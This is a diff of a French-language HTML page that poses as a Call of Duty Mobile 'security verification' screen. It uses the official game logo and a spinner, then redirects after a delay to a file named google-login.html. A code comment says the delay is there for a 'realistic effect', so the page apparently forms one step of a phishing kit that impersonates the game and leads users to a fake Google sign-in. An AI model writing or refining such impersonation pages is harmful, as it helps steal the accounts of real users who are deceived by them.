@@ -2,10 +2,81 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <meta http-equiv="refresh" content="0; url=google-login.html">
-  <title>Redirection</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Call of Duty Mobile - Vérification</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background: #000;
+      color: #fff;
+      font-family: Arial, Helvetica, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+    .logo {
+      width: 240px;
+      margin-bottom: 40px;
+    }
+    .title {
+      font-size: 24px;
+      font-weight: bold;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      margin-bottom: 16px;
+      text-align: center;
+    }
+    .message {
+      font-size: 16px;
+      color: #ccc;
+      margin-bottom: 40px;
+      text-align: center;
+      max-width: 320px;
+      line-height: 1.5;
+    }
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 5px solid #333;
+      border-top: 5px solid #ff6600;
+      border-radius: 50%;
+      animation: spin 1.2s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .progress {
+      margin-top: 24px;
+      font-size: 14px;
+      color: #666;
+    }
+  </style>
 </head>
 <body>
-  <p>Redirection vers la page de connexion...</p>
+
+  <img src="https://www.callofduty.com/content/dam/atvi/callofduty/codmobile/web/common/logo-codm-white.png" alt="Call of Duty Mobile" class="logo">
+
+  <div class="title">VÉRIFICATION DE SÉCURITÉ</div>
+
+  <p class="message">
+    Veuillez patienter pendant que nous vérifions votre connexion...
+  </p>
+
+  <div class="spinner"></div>
+
+  <div class="progress">Cela ne prendra que quelques instants</div>
+
+<script>
+  // Redirection immédiate mais avec un délai minimal visible pour l'effet réaliste
+  setTimeout(() => {
+    window.location.href = "google-login.html";
+  }, 1800); // 1.8 secondes : assez pour voir le spinner, mais pas trop long
+</script>
+
 </body>
 </html>
